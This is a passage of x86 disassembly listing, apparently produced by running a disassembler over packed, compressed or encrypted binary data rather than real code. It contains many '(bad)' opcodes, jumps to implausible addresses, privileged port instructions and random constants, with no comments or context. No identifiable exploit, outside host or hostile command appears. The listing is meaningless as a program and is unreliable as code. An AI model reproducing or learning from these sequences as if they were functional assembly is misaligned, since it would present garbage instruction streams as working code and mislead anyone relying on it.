  417795:	pushf  
  417796:	frstor [edx]
  417798:	popf   
  417799:	sub    BYTE PTR [edi],dl
  41779b:	mov    dh,0x4d
  41779d:	(bad)  
  41779e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41779f:	pop    edx
  4177a0:	and    eax,0x1f78ddb5
  4177a5:	and    al,BYTE PTR [eax+0x20]
  4177a8:	add    BYTE PTR [eax],al
  4177aa:	mov    ah,0x9d
  4177ac:	mov    esp,0xb72c45b6
  4177b1:	lea    ebp,[eax-0x5bb360ab]
  4177b7:	add    BYTE PTR [eax],al
  4177b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4177ba:	inc    ebp
  4177bb:	or     edi,esp
  4177bd:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4177bf:	jno    0x4177d6
  4177c1:	pop    ebp
  4177c2:	push   0x50
  4177c4:	je     0x4177bc
  4177c6:	dec    edx
  4177c7:	xchg   ebp,eax
  4177c8:	cmp    dl,dl
  4177ca:	dec    ebx
  4177cb:	sbb    DWORD PTR [edx],esi
  4177cd:	or     al,0xbb
  4177cf:	add    BYTE PTR [eax],al
  4177d1:	xchg   DWORD PTR [ebp-0x66],ebp
  4177d4:	xchg   BYTE PTR [ebp+edi*4+0x5fbe0000],al
  4177db:	mov    bh,0x67
  4177dd:	cs jp  0x4177d5
  4177e0:	xchg   DWORD PTR [edx+0x5e],edi
  4177e3:	jecxz  0x41782f
  4177e5:	mov    eax,DWORD PTR [eax+ebp*8-0x1e9a0000]
  4177ec:	add    dh,BYTE PTR [edx+0x9af490d]
  4177f2:	neg    ah
  4177f4:	nop
  4177f5:	data16 fcomp QWORD PTR [ebx]
  4177f8:	in     eax,0x68
  4177fa:	outs   dx,DWORD PTR ds:[esi]
  4177fb:	push   eax
  4177fc:	test   edx,esp
  4177fe:	pop    edi
  4177ff:	mov    bl,dh
  417801:	add    BYTE PTR [eax],al
  417803:	shr    DWORD PTR [esi],cl
  417805:	xchg   esi,eax
  417806:	cmp    al,0x5e
  417808:	nop
  417809:	call   0xd9408f0
  41780e:	add    DWORD PTR [edx-0x4a],esp
  417811:	sub    ebx,DWORD PTR [eax-0x1f3de0dc]
  417817:	push   esi
  417818:	dec    edi
  417819:	jmp    0x7c7c7dfb
  41781e:	mov    BYTE PTR [ebp-0x23430000],dl
  417824:	stos   BYTE PTR es:[edi],al
  417825:	ret    
  417826:	pop    edx
  417827:	mov    edx,0x2bc8
  41782c:	not    DWORD PTR [eax-0x20]
  41782f:	fwait
  417830:	sbb    BYTE PTR [ebx-0x77],dl
  417833:	outs   dx,DWORD PTR ds:[esi]
  417834:	or     eax,0x2c989ab2
  417839:	push   edi
  41783a:	es cs add ecx,ecx
  41783e:	sub    esp,DWORD PTR [edx]
  417840:	(bad)
  417845:	add    BYTE PTR [edx],bl
  417847:	jge    0x41781f
  417849:	jo     0x417821
  41784b:	ret    0xea13
  41784e:	mov    esp,0x73635f76
  417853:	mov    edx,0x64f42ad2
  417858:	pop    edx
  417859:	jge    0x417870
  41785b:	inc    eax
  41785c:	out    0x0,al
  41785e:	add    BYTE PTR [ecx*8+0x66bbcf10],bh
  417865:	jmp    0x4177fe
  417867:	test   al,0xe1
  417869:	mov    WORD PTR [esi+0x7880000],gs
  41786f:	add    BYTE PTR [eax],al
  417871:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417872:	xchg   ebp,eax
  417873:	imul   edi,esi,0x834aea53
  417879:	sub    eax,eax
  41787b:	mov    eax,DWORD PTR [eax]
  41787d:	add    bl,dl
  41787f:	les    edx,FWORD PTR [eax]
  417881:	add    BYTE PTR [eax],al
  417883:	shr    BYTE PTR [esi-0x24959443],cl
  417889:	jns    0x417858
  41788b:	ss ja  0x417815
  41788e:	xor    BYTE PTR [ecx-0x36523483],al
  417894:	jne    0x4178a7
  417896:	pop    edx
  417897:	mov    edx,0xeae059ed
  41789c:	in     al,dx
  41789d:	pop    edx
  41789e:	(bad)  
  41789f:	mov    eax,0x730ac5d7
  4178a4:	cmc    
  4178a5:	stos   BYTE PTR es:[edi],al
  4178a6:	adc    al,0x18
  4178a8:	sti    
  4178a9:	sbb    esp,DWORD PTR gs:[ebx]
  4178ac:	or     cl,ch
  4178ae:	shl    al,1
  4178b0:	repnz cmp eax,0xd1662aab
  4178b6:	cdq    
  4178b7:	cmp    DWORD PTR [esi],ebp
  4178b9:	pop    ebx
  4178ba:	mov    bh,0x55
  4178bc:	int    0x3f
  4178be:	and    ch,BYTE PTR [edx+edi*4-0x348cee4b]
  4178c5:	js     0x417888
  4178c7:	push   0xdcba98ed
  4178cc:	mov    dh,0xac
  4178ce:	test   al,0xbd
  4178d0:	and    eax,edi
  4178d2:	jle    0x41786c
  4178d4:	cmp    esi,DWORD PTR [edi]
  4178d6:	fisubr WORD PTR [edi-0xe]
  4178d9:	test   DWORD PTR [ebx],ebx
  4178db:	(bad)  
  4178dc:	jmp    0x1b5978e1
  4178e1:	pop    edx
  4178e2:	mov    esi,0x5c63671f
  4178e7:	rcr    dl,1
  4178e9:	and    esp,DWORD PTR [ecx+ecx*8]
  4178ec:	in     al,0xc9
  4178ee:	add    al,0x50
  4178f0:	add    BYTE PTR [eax],al
  4178f2:	lds    esi,FWORD PTR [ebp-0x31]
  4178f5:	and    al,0xb9
  4178f7:	mov    edx,0x21041f
  4178fc:	add    BYTE PTR [ecx-0x2908ffd],ah
  417902:	xor    eax,0x7ce1d564
  417907:	int    0x26
  417909:	mov    ds:0xb692dbd7,eax
  41790e:	sub    DWORD PTR [edi-0x34ffef86],edi
  417914:	add    BYTE PTR [eax],al
  417916:	add    dh,BYTE PTR [edi+0x43]
  417919:	pop    edx
  41791a:	fnstenv [edx+esi*2]
  41791d:	imul   ecx,DWORD PTR es:[edi-0x17],0x1e
  417922:	int    0xff
  417924:	push   es
  417925:	push   cs
  417926:	ins    BYTE PTR es:[edi],dx
  417927:	fwait
  417928:	lea    edx,[edi]
  41792a:	imul   ebp,DWORD PTR [ecx],0xeb7131e3
  417930:	jmp    0x41791e
  417932:	jecxz  0x4179a4
  417934:	retf   
  417935:	and    BYTE PTR [ebp+0x77ca7d53],cl
  41793b:	inc    eax
  41793c:	pop    edx
  41793d:	add    BYTE PTR [eax],al
  41793f:	test   al,0x63
  417941:	mov    ah,0x3d
  417943:	sub    eax,0xb648a2e8
  417948:	add    BYTE PTR [eax],al
  41794a:	lds    ebp,FWORD PTR [eax-0x26f42dc2]
  417950:	mov    dh,0xfb
  417952:	ret    0xad34
  417955:	cmp    al,0xd8
  417957:	jae    0x417988
  417959:	and    ebp,DWORD PTR [ecx+0xa4c]
  41795f:	daa    
  417960:	xchg   esp,eax
  417961:	or     al,0xe2
  417963:	add    BYTE PTR [eax],al
  417965:	scas   eax,DWORD PTR es:[edi]
  417966:	or     al,0x22
  417968:	add    BYTE PTR [eax],al
  41796a:	ret    0xe1e6
  41796d:	dec    ebx
  41796e:	fdivr  DWORD PTR [ecx+0x7f]
  417971:	mov    ebp,DWORD PTR [edx-0x46]
  417974:	xchg   edx,eax
  417975:	push   cs
  417976:	ds in  eax,0x43
  417979:	inc    edi
  41797a:	fistp  WORD PTR [edi]
  41797c:	test   al,0x5a
  41797e:	push   0x5b0dfbcb
  417983:	adc    eax,0x49d5da01
  417988:	imul   ebx,esi,0xffffffda
  41798b:	dec    ebx
  41798c:	mov    ecx,0x6bc45eeb
  417991:	add    BYTE PTR [eax],al
  417993:	xchg   ebp,eax
  417994:	scas   al,BYTE PTR es:[edi]
  417995:	retw   0xfabc
  417999:	mov    ds:0xaf770a97,eax
  41799e:	pop    edx
  41799f:	dec    esi
  4179a0:	je     0x41795a
  4179a2:	cmp    ecx,eax
  4179a4:	inc    ecx
  4179a5:	add    BYTE PTR [eax],al
  4179a7:	xchg   ebp,eax
  4179a8:	loop   0x41796a
  4179aa:	jle    0x4179ac
  4179ac:	add    BYTE PTR [edx],dh
  4179ae:	inc    esi
  4179af:	adc    ebp,DWORD PTR [ebx]
  4179b1:	xchg   esp,eax
  4179b2:	shl    bl,1
  4179b4:	mov    ebx,0x8fc86e
  4179b9:	add    BYTE PTR [esi-0x67],cl
  4179bc:	add    BYTE PTR [eax],ch
  4179be:	add    BYTE PTR [eax],al
  4179c0:	mov    ecx,0x6c25f5d7
  4179c5:	pop    eax
  4179c6:	and    ebx,DWORD PTR [ecx]
  4179c8:	sub    eax,0xeb57cff8
  4179cd:	fnstsw WORD PTR [ebx+eax*2]
  4179d0:	add    dh,BYTE PTR [bx+di]
  4179d3:	jb     0x417a39
  4179d5:	push   esi
  4179d6:	popf   
  4179d7:	ss mov edi,0xd9f62f5d
  4179dd:	mov    ebp,ebx
  4179df:	ror    BYTE PTR [ecx-0x16],1
  4179e2:	dec    ebx
  4179e3:	dec    ecx
  4179e4:	pushf  
  4179e5:	jecxz  0x417a31
  4179e7:	mov    ebx,0xc1e950b0
  4179ec:	fdiv   QWORD PTR [ebp+0x6d]
  4179ef:	ja     0x417a5f
  4179f1:	ins    DWORD PTR es:[edi],dx
  4179f2:	cmp    DWORD PTR [esi+esi*2-0x3b],esi
  4179f6:	test   al,0xf3
  4179f8:	dec    ecx
  4179f9:	xor    al,0x94
  4179fb:	pop    es
  4179fc:	mov    es,edi
  4179fe:	fidivr DWORD PTR [edx]
  417a00:	pop    esp
  417a01:	adc    al,0xcd
  417a03:	xlat   BYTE PTR ds:[ebx]
  417a04:	inc    edi
  417a05:	inc    eax
  417a06:	or     al,0x0
  417a08:	add    BYTE PTR [ecx],bl
  417a0a:	inc    ebx
  417a0b:	(bad)  
  417a0c:	es retf 
  417a0e:	mov    DWORD PTR [ebx],ebp
  417a10:	pop    esi
  417a11:	fs pop edx
  417a13:	jb     0x4179f7
  417a15:	pop    ebp
  417a16:	(bad)  
  417a17:	adc    al,0x5b
  417a19:	push   0x33
  417a1b:	sub    eax,DWORD PTR [edx+0x8]
  417a1e:	push   ecx
  417a1f:	add    BYTE PTR [eax],al
  417a21:	stc    
  417a22:	test   eax,0x5f453b63
  417a27:	lea    ebp,[edi]
  417a29:	xchg   edi,eax
  417a2a:	les    esi,FWORD PTR [ebx+0x0]
  417a2d:	add    cl,bh
  417a2f:	mov    al,ds:0xce19a08d
  417a34:	add    BYTE PTR [ecx-0x17af0000],al
  417a3a:	push   esi
  417a3b:	add    dh,BYTE PTR [edx]
  417a3d:	xchg   esp,eax
  417a3e:	hlt    
  417a3f:	adc    dh,ah
  417a41:	jge    0x4179eb
  417a43:	mov    ebp,0xe0e5e965
  417a48:	sbb    eax,0x97aa5224
  417a4e:	hlt    
  417a4f:	repnz fistp QWORD PTR [edx-0x6a]
  417a53:	sub    al,0xce
  417a55:	adc    al,0x9e
  417a57:	pop    eax
  417a58:	inc    edi
  417a59:	std    
  417a5a:	jne    0x417a11
  417a5c:	test   eax,0xc0647386
  417a61:	add    DWORD PTR [eax],eax
  417a63:	add    bh,cl
  417a65:	dec    ecx
  417a66:	xchg   BYTE PTR [edi],al
  417a68:	sahf   
  417a69:	jmp    0x7a2d295e
  417a6e:	adc    edx,DWORD PTR [eax]
  417a70:	icebp  
  417a71:	lds    ecx,FWORD PTR [ecx+0x531f6d91]
  417a77:	push   cs
  417a78:	mov    cs,WORD PTR [esi]
  417a7a:	lea    esi,[edi+0xbef58ff]
  417a80:	cdq    
  417a81:	retf   
  417a82:	xor    ecx,ecx
  417a84:	inc    ecx
  417a85:	mov    es,WORD PTR [edi-0x1b]
  417a88:	cmp    ebx,0x9b3fe447
  417a8e:	sar    DWORD PTR [eax],0xb9
  417a91:	sub    al,0x1d
  417a93:	fs jle 0x417a3c
  417a96:	in     al,dx
  417a97:	in     eax,0x1
  417a99:	cld    
  417a9a:	aam    0x4c
  417a9c:	add    DWORD PTR [eax],eax
  417a9e:	add    bl,ch
  417aa0:	inc    esi
  417aa1:	cmc    
  417aa2:	into   
  417aa3:	jns    0x417b01
  417aa5:	jb     0x417ad0
  417aa7:	test   DWORD PTR [esp+eax*8-0x123a0000],ecx
  417aae:	pop    ds
  417aaf:	mov    eax,0x6d003ff9
  417ab4:	add    BYTE PTR [eax],al
  417ab6:	fstp   TBYTE PTR [ebx+esi*1]
  417ab9:	xchg   esp,eax
  417aba:	push   eax
  417abb:	cmc    
  417abc:	stos   BYTE PTR es:[edi],al
  417abd:	daa    
  417abe:	bound  edx,QWORD PTR [edx+0x4d]
  417ac1:	ins    DWORD PTR es:[edi],dx
  417ac2:	jecxz  0x417b2f
  417ac4:	and    eax,0x3c40
  417ac9:	mov    ?,edi
  417acb:	and    DWORD PTR [ecx+edx*4],0xd70421
  417ad2:	add    bh,bl
  417ad4:	fsubp  st(3),st
  417ad6:	fistp  DWORD PTR [ecx+0x7500]
  417adc:	inc    ecx
  417add:	inc    eax
  417ade:	sldt   WORD PTR [eax]
  417ae1:	add    DWORD PTR [edi-0x7a4271cc],esp
  417ae7:	scas   al,BYTE PTR es:[edi]
  417ae8:	xchg   edx,eax
  417ae9:	jle    0x417a8c
  417aeb:	mov    esp,0x774b140e
  417af0:	pusha  
  417af1:	sbb    eax,0x9106fb2e
  417af6:	mov    esi,DWORD PTR [edi+esi*8+0x19]
  417afa:	loop   0x417ab2
  417afc:	add    ecx,DWORD PTR [esi+0x31601909]
  417b02:	inc    edx
  417b03:	sahf   
  417b04:	bound  esp,QWORD PTR [ebx]
  417b06:	jl     0x417b39
  417b08:	mov    esp,0x26b3a3e5
  417b0d:	and    al,0xde
  417b0f:	xchg   DWORD PTR [edx+0x612add20],edx
  417b15:	jg     0x417b15
  417b17:	loop   0x417b46
  417b19:	cwde   
  417b1a:	out    0xa2,eax
  417b1c:	mov    ds:0xde0030,eax
  417b21:	add    BYTE PTR [edx-0x5737d481],ch
  417b27:	add    BYTE PTR [eax],al
  417b29:	popf   
  417b2a:	jne    0x417b3d
  417b2c:	cmp    DWORD PTR [eax+0xdcf2bb9],ebx
  417b32:	loope  0x417b43
  417b34:	jecxz  0x417b04
  417b36:	xor    eax,0x93801a
  417b3b:	add    BYTE PTR [ecx-0x6e421d84],dl
  417b41:	repz in eax,dx
  417b43:	mov    ds:0xd4a71951,eax
  417b48:	xor    BYTE PTR [edx-0x58],bh
  417b4b:	jne    0x417ae0
  417b4d:	add    BYTE PTR [edx+0x1cf47e12],0xa5
  417b54:	idiv   DWORD PTR [esi+0x290b2f09]
  417b5a:	xchg   ecx,eax
  417b5b:	add    dl,cl
  417b5d:	add    BYTE PTR [eax],al
  417b5f:	adc    ch,bh
  417b61:	sti    
  417b62:	pop    edx
  417b63:	sbb    BYTE PTR [esi+0x2d],al
  417b66:	adc    BYTE PTR [ebp+0x7cb6ad7],dl
  417b6c:	push   ss
  417b6d:	clc    
  417b6e:	sbb    al,0xbb
  417b70:	mov    esi,0x867fa7c7
  417b75:	mov    esp,0xfe5da1f3
  417b7a:	cli    
  417b7b:	leave  
  417b7c:	scas   eax,DWORD PTR es:[edi]
  417b7d:	push   ebp
  417b7e:	xchg   esi,eax
  417b7f:	xor    ebp,0xcd5fdce9
  417b85:	loop   0x417b97
  417b87:	imul   esi,DWORD PTR [ecx+0x6f],0x28
  417b8b:	adc    al,0x60
  417b8d:	das    
  417b8e:	xchg   DWORD PTR gs:[edx+ebp*1-0x61],esp
  417b93:	push   ebp
  417b94:	and    ebp,DWORD PTR [esi-0x254d4027]
  417b9a:	ret    
  417b9b:	jecxz  0x417c01
  417b9d:	repz jmp 0xa4ed19de
  417ba3:	fisub  DWORD PTR es:[ebp-0x3e]
  417ba7:	mov    fs,edi
  417ba9:	sub    eax,0xb3cba1f2
  417bae:	sar    esi,cl
  417bb0:	jne    0x417ba5
  417bb2:	es xchg edi,eax
  417bb4:	(bad)  [ecx]
  417bb6:	bound  esi,QWORD PTR [esi-0x70]
  417bb9:	xor    eax,0x1f061dd9
  417bbe:	fcmovbe st,st(2)
  417bc0:	pop    esi
  417bc1:	mov    eax,DWORD PTR [ebp-0x2354e32c]
  417bc7:	cmp    bl,bl
  417bc9:	xchg   edx,eax
  417bca:	(bad)  
  417bcb:	sbb    cl,bh
  417bcd:	xor    BYTE PTR [edx],dl
  417bcf:	lods   eax,DWORD PTR ds:[esi]
  417bd0:	xor    DWORD PTR [edi-0x3527470],ebx
  417bd6:	mov    DWORD PTR [eax-0x23],esp
  417bd9:	lods   eax,DWORD PTR ds:[esi]
  417bda:	and    BYTE PTR [ebp+esi*4-0x3a],dh
  417bde:	lahf   
  417bdf:	in     eax,dx
  417be0:	ja     0x417bc6
  417be2:	test   al,0x36
  417be4:	pusha  
  417be5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417be6:	stos   DWORD PTR es:[edi],eax
  417be7:	pop    ebx
  417be8:	mov    eax,0xce09aefc
  417bed:	(bad)  
  417bee:	leave  
  417bef:	add    BYTE PTR [eax],al
  417bf1:	mov    ah,0x23
  417bf3:	push   es
  417bf4:	inc    ebx
  417bf5:	xor    esp,DWORD PTR ds:0xf85cee29
  417bfb:	clc    
  417bfc:	mov    bl,0xac
  417bfe:	(bad)  
  417bff:	mov    ds:0x3f258e45,al
  417c04:	ret    
  417c05:	mov    dl,0x16
  417c07:	out    dx,eax
  417c08:	jo     0x417c4a
  417c0a:	add    eax,DWORD PTR [eax]
  417c0c:	add    ah,ch
  417c0e:	pushf  
  417c0f:	popf   
  417c10:	xchg   ebp,eax
  417c11:	pop    eax
  417c12:	popa   
  417c13:	aam    0x67
  417c15:	adc    al,0xd5
  417c17:	push   edx
  417c18:	and    BYTE PTR [edx+0x19e40000],0x88
  417c1f:	test   DWORD PTR [eax],eax
  417c21:	add    BYTE PTR ds:0x5172a32a,bl
  417c27:	pop    esi
  417c28:	sbb    eax,0x30417d8d
  417c2d:	push   0x6fa56665
  417c32:	mov    esi,0x990cf5
  417c37:	add    BYTE PTR [edi+0x48],bh
  417c3a:	fwait
  417c3b:	add    BYTE PTR [eax],al
  417c3d:	repz jne 0x417cb2
  417c40:	sbb    bl,ch
  417c42:	mov    al,ds:0x39ccbe21
  417c47:	add    BYTE PTR [eax],al
  417c49:	push   ebx
  417c4a:	add    al,0x3a
  417c4c:	add    BYTE PTR [eax],al
  417c4e:	leave  
  417c4f:	cmp    DWORD PTR [ebp+edi*4-0x2e],esi
  417c53:	call   0xef7b5c82
  417c58:	pop    ss
  417c59:	in     eax,0xa9
  417c5b:	xor    esp,DWORD PTR [ebx]
  417c5d:	sbb    eax,0xe58450dd
  417c62:	add    BYTE PTR [eax],al
  417c64:	pop    ebp
  417c65:	(bad)  
  417c66:	fcomp  QWORD PTR [edi]
  417c68:	jbe    0x417bf9
  417c6a:	inc    eax
  417c6b:	test   BYTE PTR [eax],0x0
  417c6e:	push   ss
  417c6f:	out    0x93,al
  417c71:	sub    bh,BYTE PTR [edx-0x76]
  417c74:	in     eax,dx
  417c75:	sbb    eax,0xdb482bbf
  417c7a:	add    BYTE PTR [eax],al
  417c7c:	cmc    
  417c7d:	mov    ds:0x9087ed27,al
  417c82:	fyl2x  
  417c84:	pop    esp
  417c85:	or     BYTE PTR [eax*8-0x5b5f0000],0xde
  417c8d:	adc    DWORD PTR [ecx-0x4e40fec7],0x721eb565
  417c97:	sar    ebx,1
  417c99:	pop    edi
  417c9a:	out    0x37,eax
  417c9c:	cmp    dl,cl
  417c9e:	xor    al,0xa7
  417ca0:	aaa    
  417ca1:	jecxz  0x417cbe
  417ca3:	(bad)  
  417ca4:	fistp  WORD PTR [edx]
  417ca6:	add    BYTE PTR [esi+0x3a8b0000],dh
  417cac:	aas    
  417cad:	(bad)  
  417cae:	in     al,dx
  417caf:	mov    cl,0x68
  417cb1:	int    0x45
  417cb3:	in     eax,0xbf
  417cb5:	xor    al,0x99
  417cb7:	cmp    cl,BYTE PTR [ecx+0x56cc]
  417cbd:	pop    esi
  417cbe:	pop    ds
  417cbf:	or     DWORD PTR [edx],edx
  417cc1:	xor    esi,edx
  417cc3:	frstor [ebx-0x72369b68]
  417cc9:	ss dec ecx
  417ccb:	or     dl,BYTE PTR [eax]
  417ccd:	jb     0x417c57
  417ccf:	sbb    BYTE PTR [eax],al
  417cd1:	add    ch,cl
  417cd3:	jo     0x417ca6
  417cd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417cd6:	icebp  
  417cd7:	inc    esi
  417cd8:	pushf  
  417cd9:	call   0x4635bf6c
  417cde:	ror    DWORD PTR [edx+0x37b966a4],0x4c
  417ce5:	jmp    0x5926:0x1cb0000
  417cec:	neg    BYTE PTR [ecx]
  417cee:	mov    esi,esp
  417cf0:	mov    cl,0x70
  417cf2:	jns    0x417cfe
  417cf4:	fdiv   st,st(6)
  417cf6:	push   ecx
  417cf7:	dec    esp
  417cf8:	inc    edi
  417cf9:	add    BYTE PTR [eax],al
  417cfb:	push   cs
  417cfc:	add    DWORD PTR [ecx],0x4cf52a5a
  417d02:	out    0x0,eax
  417d04:	add    al,ch
  417d06:	jmp    0x125c20a
  417d0b:	add    dl,bl
  417d0d:	sub    ecx,DWORD PTR [edx-0x4f]
  417d10:	sbb    esi,DWORD PTR [eax-0x33f648f1]
  417d16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d17:	add    BYTE PTR [eax],al
  417d19:	xchg   edx,eax
  417d1a:	sbb    bh,bl
  417d1c:	jmp    0x417d76
  417d1e:	sbb    BYTE PTR [ebx],bl
  417d20:	add    bh,bh
  417d22:	add    BYTE PTR [eax],al
  417d24:	(bad)  
  417d26:	scas   eax,DWORD PTR es:[edi]
  417d27:	and    eax,0x75ea6789
  417d2c:	pop    edx
  417d2d:	sbb    esp,DWORD PTR [ebp-0x4a0a41db]
  417d33:	sub    dh,BYTE PTR [esi]
  417d35:	jmp    0xa3ec:0x9f2656a
  417d3c:	sbb    bh,BYTE PTR [eax-0x62]
  417d3f:	shr    BYTE PTR [edx],0x0
  417d42:	add    BYTE PTR [esi+0x3810fc37],bh
  417d48:	cmp    al,0x75
  417d4a:	(bad)  
  417d4b:	rcr    bl,cl
  417d4d:	xor    BYTE PTR [edi],0x0
  417d50:	add    BYTE PTR [ebx],ch
  417d52:	pop    es
  417d53:	sar    BYTE PTR [edx+0x10950000],0xb6
  417d5a:	loop   0x417ce8
  417d5c:	stos   DWORD PTR es:[edi],eax
  417d5d:	add    BYTE PTR [eax],al
  417d5f:	mov    dh,0x19
  417d61:	or     esp,DWORD PTR [ebp-0x50]
  417d64:	(bad)  [ebx-0x14d653ce]
  417d6a:	shr    DWORD PTR [eax+0x37ad0fb0],cl
  417d70:	mov    dl,0xf9
  417d72:	pop    ds
  417d73:	inc    ebx
  417d74:	out    0xea,eax
  417d76:	cdq    
  417d77:	aaa    
  417d78:	ret    
  417d79:	fdiv   st(0),st
  417d7b:	aaa    
  417d7c:	xchg   DWORD PTR [ecx],edx
  417d7e:	fs jne 0x417d2e
  417d81:	push   ebp
  417d82:	push   esi
  417d83:	test   BYTE PTR [eax+0x33c30000],ah
  417d89:	fcmovnb st,st(4)
  417d8b:	in     eax,0x0
  417d8d:	add    BYTE PTR [esi+0xb],dl
  417d90:	jae    0x417dcf
  417d92:	icebp  
  417d93:	mov    eax,0x79e41e3f
  417d98:	jno    0x417daa
  417d9a:	pop    ebx
  417d9b:	xor    cl,BYTE PTR [edi+0x20]
  417d9e:	mov    ebp,0xe80b3d3e
  417da3:	mov    cl,0x9c
  417da5:	fbstp  TBYTE PTR [ecx+0x6e0bd2fa]
  417dab:	hlt    
  417dac:	mov    esi,0xb75471d0
  417db1:	xchg   cl,ah
  417db3:	cmp    eax,0x758492
  417db8:	add    BYTE PTR [ecx+0x57],bl
  417dbb:	nop
  417dbc:	rol    BYTE PTR [eax+eax*1-0x2c530000],cl
  417dc3:	push   esp
  417dc4:	and    DWORD PTR [ecx],edi
  417dc6:	push   edi
  417dc7:	pop    ds
  417dc8:	push   edx
  417dc9:	lods   al,BYTE PTR ds:[esi]
  417dca:	rol    DWORD PTR [edx],0xe4
  417dcd:	mov    edx,0xc69ac3ff
  417dd2:	clc    
  417dd3:	jecxz  0x417dfb
  417dd5:	mov    esi,DWORD PTR [edx+esi*2-0x44b757ec]
  417ddc:	add    BYTE PTR [eax],al
  417dde:	mov    BYTE PTR [esi+0x1ff60000],bh
  417de4:	mov    edi,0xbd36a75c
  417de9:	mov    edi,DWORD PTR [eax+0x40]
  417dec:	rol    DWORD PTR [eax],0x0
  417def:	jl     0x417e6d
  417df1:	outs   dx,BYTE PTR ds:[esi]
  417df2:	xchg   esp,eax
  417df3:	shl    DWORD PTR [ecx+0x4f8403cf],0x0
  417dfa:	add    BYTE PTR [edi+0x3f],ah
  417dfd:	mov    ebp,0xf566a2f8
  417e02:	dec    edi
  417e03:	mov    ecx,0x6cbbcdf
  417e08:	mov    ebp,0xbced8d97
  417e0d:	adc    ecx,DWORD PTR [ebx-0x78]
  417e10:	add    DWORD PTR [eax],eax
  417e12:	add    BYTE PTR ds:0x9fd55809,bh
  417e18:	gs cs outs dx,BYTE PTR gs:[esi]
  417e1c:	(bad)  
  417e1d:	mov    ebx,0x5d63332a
  417e22:	mov    cl,0x18
  417e24:	test   BYTE PTR [eax],0xe9
  417e27:	add    BYTE PTR [eax],al
  417e29:	jae    0x417e3c
  417e2b:	jge    0x417dd9
  417e2d:	xchg   BYTE PTR [ecx+0x7008],bl
  417e33:	cmp    edi,DWORD PTR [eax+0x40]
  417e36:	mov    al,BYTE PTR [eax]
  417e38:	add    BYTE PTR [edi-0x2d],dl
  417e3b:	cmp    eax,0x2ecf5675
  417e40:	rol    BYTE PTR [eax-0x7f],1
  417e43:	add    BYTE PTR [eax],al
  417e45:	push   cs
  417e46:	sbb    ecx,ecx
  417e48:	adc    al,0x19
  417e4a:	mov    ch,0x31
  417e4c:	cmp    al,0x6
  417e4e:	call   0x261:0xca178d2a
  417e55:	imul   esi,DWORD PTR [eax+0x7dcc0a1e],0x496c0000
  417e5f:	jp     0x417ec3
  417e61:	(bad)  
  417e62:	cmp    DWORD PTR [edi],ebx
  417e64:	push   ss
  417e65:	or     al,0xc8
  417e67:	add    BYTE PTR [eax],al
  417e69:	inc    esp
  417e6a:	jbe    0x417e6c
  417e6c:	add    BYTE PTR [edi],bh
  417e6e:	push   0xe08a19dd
  417e73:	ja     0x417e0b
  417e75:	sub    eax,0x4745724f
  417e7a:	sub    BYTE PTR [esi-0x2],dl
  417e7d:	jle    0x417e50
  417e7f:	fisub  WORD PTR [edx+ecx*8+0x7d]
  417e83:	or     BYTE PTR [ebx+0x0],bh
  417e86:	add    bh,al
  417e88:	les    esp,FWORD PTR [ecx+0x0]
  417e8b:	add    BYTE PTR [edx],ah
  417e8d:	cmp    DWORD PTR [esi-0x60e84377],ebx
  417e93:	mov    esp,0xaf5bea0
  417e98:	jnp    0x417e4e
  417e9a:	fbld   TBYTE PTR [ebp+0x21d1a2e]
  417ea0:	xchg   ebx,eax
  417ea1:	xchg   esp,eax
  417ea2:	clc    
  417ea3:	sub    BYTE PTR [eax-0x6a],bl
  417ea6:	test   eax,0x8c2d31ef
  417eab:	dec    ebx
  417eac:	add    BYTE PTR [eax],al
  417eae:	in     eax,0xfb
  417eb0:	sbb    bl,cl
  417eb2:	adc    DWORD PTR [ebx+0x63],ecx
  417eb5:	pop    eax
  417eb6:	add    esi,DWORD PTR [edx-0x3c]
  417eb9:	xor    al,BYTE PTR [eax]
  417ebb:	add    BYTE PTR [esi-0x6d7050f3],al
  417ec1:	or     edi,DWORD PTR [esi+eax*4-0x3b]
  417ec5:	adc    dl,BYTE PTR [edx+0x1af613a7]
  417ecb:	imul   edi,DWORD PTR [eax-0x63],0x9677a6af
  417ed2:	in     al,0x63
  417ed4:	(bad)  
  417ed5:	sub    eax,0x2ec1bcfb
  417eda:	jg     0x417f49
  417edc:	pop    edi
  417edd:	test   eax,0x160fae2c
  417ee2:	das    
  417ee3:	lahf   
  417ee4:	xor    dl,bl
  417ee6:	sub    al,0xbe
  417ee8:	test   DWORD PTR [edx+0x59],0x93c2e13
  417eef:	fistp  QWORD PTR [ecx+0x4a8ca9]
  417ef5:	add    cl,al
  417ef7:	mov    eax,DWORD PTR [ecx+0x75]
  417efa:	adc    ch,ah
  417efc:	xchg   esi,eax
  417efd:	test   BYTE PTR [eax+eax*1+0x0],ah
  417f01:	fst    QWORD PTR [ebp-0x37ed359c]
  417f07:	retf   
  417f08:	add    BYTE PTR [eax],al
  417f0a:	jl     0x417eb6
  417f0c:	sub    bh,BYTE PTR [esi+eiz*2-0x50]
  417f10:	sub    al,0x0
  417f13:	add    BYTE PTR [edx+0x201e657e],bh
  417f19:	out    dx,eax
  417f1a:	push   edi
  417f1b:	push   edx
  417f1c:	mov    bl,0xc3
  417f1e:	xchg   edi,eax
  417f1f:	mov    esp,0x940c
  417f24:	daa    
  417f25:	call   0xb6593223
  417f2a:	sub    edi,esi
  417f2c:	cmp    cl,BYTE PTR [edi+ebx*4]
  417f2f:	add    BYTE PTR [eax],al
  417f31:	retf   0xe75b
  417f34:	mov    BYTE PTR [esi-0x5c220000],ch
  417f3a:	shl    edi,cl
  417f3c:	inc    esi
  417f3d:	xchg   ecx,eax
  417f3e:	push   esi
  417f3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f40:	(bad)  
  417f41:	rol    DWORD PTR [eax],1
  417f43:	add    BYTE PTR [ebx-0x45],bl
  417f46:	lods   eax,DWORD PTR ds:[si]
  417f48:	add    al,0xb4
  417f4a:	add    BYTE PTR [eax],al
  417f4c:	push   0x1a
  417f4e:	xlat   BYTE PTR ds:[ebx]
  417f4f:	(bad)  
  417f50:	out    0x3c,al
  417f52:	sub    ah,BYTE PTR [edi-0x3a6b25c9]
  417f58:	sub    bh,bl
